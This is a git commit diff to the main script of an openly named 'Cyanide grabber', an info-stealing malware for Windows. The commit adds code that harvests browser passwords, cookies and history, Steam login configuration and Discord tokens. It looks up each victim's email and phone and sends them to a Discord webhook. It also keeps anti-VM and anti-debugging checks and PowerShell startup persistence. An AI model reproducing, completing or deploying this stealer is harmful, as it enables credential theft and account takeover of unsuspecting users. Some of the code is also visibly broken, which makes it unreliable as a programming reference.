212dbc809eca9eb2b98b2f0d36a818cb930b905e
Aniko <gtabro666@gmail.com>
2023-03-13 18:23:42 +0100

    sending on webhook

--- main.py
+++ main.py
@@ -1,23 +1,29 @@
 import os
-import sys
 import vdf
+import base64
+import json
+import nukelib
 
 from core.componets import extractor
 from core.componets import antivm
 from core.componets import sysinfo
 from core.componets import tokengrabber
 
+from discord_webhook import DiscordEmbed, DiscordWebhook
+
 class Main:
     def __init__(self) -> None:
-        pass
+        self.webhook = DiscordWebhook(url='', username="Cyanide")
 
-    def antivm(self):
-        if antivm.Antivm.run():
-            sys.quit()
+    def convert2Base64(creds: list):
+        dataBuffer = {}
+        for cell in creds:
+            dataBuffer.update(cell)
         
-        antivm.AntiDebug.checks()
-        
+        base64.b64encode(json.dumps(dataBuffer, indent=3).encode()).decode()
+
     def browser(self):
+        creds = []
         for key in extractor.browsers_profile:
             browser = extractor.browsers_profile[key]
 
@@ -34,6 +40,10 @@ class Main:
                     history = extraction.extractHistory(os.path.join(browser, profile, "History"))
                     cookies = extraction.extractCookies(os.path.join(browser, profile))
 
+                    summary = {browser: {"Passwords": passwds, "History": history, "Cookies": cookies}}
+
+                    creds.append(summary)
+
         for key in extractor.browsers:
             browser = extractor.browsers[key]
 
@@ -43,6 +53,12 @@ class Main:
                 history = extraction.extractHistory(os.path.join(browser, "History"))
                 cookies = extraction.extractCookies(os.path.join(browser))
 
+                summary = {browser: {"Passwords": passwds, "History": history, "Cookies": cookies}}
+
+                creds.append(summary)
+        
+        return creds
+    
     def steam(self):
         steamUsers = os.path.abspath(os.path.join(os.sep, "Program Files (x86)", "Steam", "config", "loginusers.vdf"))
 
@@ -53,33 +69,59 @@ class Main:
             return usersConfig
         
     def addStartup(self, linkname: str, pathExec: str):
-        script = f"""
-
-        $sh = New-Object -ComObject WScript.Shell
-        $userStartupFolderPath = [Environment]::GetFolderPath("Startup")
-        $shortcutFile = $sh.CreateShortcut("$userStartupFolderPath\{linkname}.lnk")
-        $shortcutFile.TargetPath = "{pathExec}"
-        $shortcutFile.Save()
-        """
-        sysinfo.runPowershell(script)
+        if not os.path.exists(os.path.join((os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup", linkname))):
+            script = f"""
+            $sh = New-Object -ComObject WScript.Shell
+            $userStartupFolderPath = [Environment]::GetFolderPath("Startup")
+            $shortcutFile = $sh.CreateShortcut("$userStartupFolderPath\{linkname}.lnk")
+            $shortcutFile.TargetPath = "{pathExec}"
+            $shortcutFile.Save()
+            """
+            sysinfo.runPowershell(script)
 
 
     def token(self):
         extractor.Anti_tokenprotector.killprotector()
         tokens = tokengrabber.extract_tokens().tokens
-        # print(tokens)
+        
+        return tokens
 
     def run(self):
+        
         antivm.Antivm.run()
         antivm.Antidbg.proc_check()
         antivm.Antidbg.dll_check()
 
         # antivm.Antidbg.process_check()
 
-        self.steam()
-        self.browser()
-        self.token()
-        self.addStartup("ciao", os.path.realpath(__file__))
+        self.addStartup("MyApp", os.path.realpath(__file__))
+        
+        userConfig = self.steam()
+        listCreds = self.browser()
+        tokens = self.token()
+
+        for token in tokens:
+            userinfo = nukelib.account_info(token)
+            
+            embed = DiscordEmbed(title=userinfo["username"], icon_url=f"https://cdn.discordapp.com/avatars/{userinfo['id']/userinfo['avatar']}")
+            embed.add_embed_field(name='Token', value=token)
+            embed.add_embed_field(name='Locale', value=userinfo["locale"])
+            embed.add_embed_field(name='Email', value=userinfo["email"])
+            embed.add_embed_field(name='Phone', value=userinfo["phone"])
+            embed.add_embed_field(name='Verified', value=str(userinfo["verified"]))
+            embed.set_footer(text='By Cyanide grabber')
+
+            embed.set_timestamp()
+
+            self.webhook.add_embed(embed)
+        
+        embed = DiscordEmbed(title="Report")
+        embed.add_embed_field(name='Tokens', value='`'+str(token)+'`')
+        embed.add_embed_field(name='Steam user config', value='```'+vdf.dumps(userConfig, True)+'```')
+        embed.set_timestamp()
+        self.webhook.add_embed(embed)
+        r = self.webhook.execute()
+
 
 if __name__ == "__main__":
     Main().run()
